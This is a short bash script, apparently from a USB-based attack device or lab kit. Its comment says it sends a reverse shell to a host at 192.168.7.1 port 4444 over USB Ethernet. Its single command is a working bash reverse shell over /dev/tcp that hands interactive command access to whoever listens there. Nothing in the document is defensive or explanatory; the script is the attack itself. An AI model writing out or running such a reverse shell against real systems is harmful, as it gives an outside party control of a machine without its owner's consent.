#!/bin/bash
# Sends a reverse shell to host over USB Ethernet (host: 192.168.7.1:4444)

bash -i >& /dev/tcp/192.168.7.1/4444 0>&1
